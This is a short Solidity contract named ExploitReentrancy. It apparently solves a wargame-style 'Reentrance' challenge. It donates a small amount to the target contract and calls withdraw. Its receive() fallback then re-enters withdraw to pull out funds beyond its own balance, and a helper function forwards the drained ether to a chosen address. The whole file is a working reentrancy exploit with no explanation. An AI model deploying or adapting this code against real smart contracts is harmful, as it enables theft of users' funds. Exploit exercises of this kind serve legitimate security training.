// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import {Reentrance} from "../src/contracts/Reentrance.sol";

contract ExploitReentrancy {
    Reentrance public reentrance;
    uint8 check = 0;

    constructor(address payable _reentrance) public {
        reentrance = Reentrance(_reentrance);
    }

    function attack() public payable {
        reentrance.donate{value: 1000000000000000}(address(this));
        reentrance.withdraw(1000000000000000);
    }

    function withdraw(address _myaddress) public {
        payable(_myaddress).transfer(address(this).balance);
    }

    receive() external payable {
        if (check < 1) {
            check++;
            reentrance.withdraw(1000000000000000);
        }
    }
}
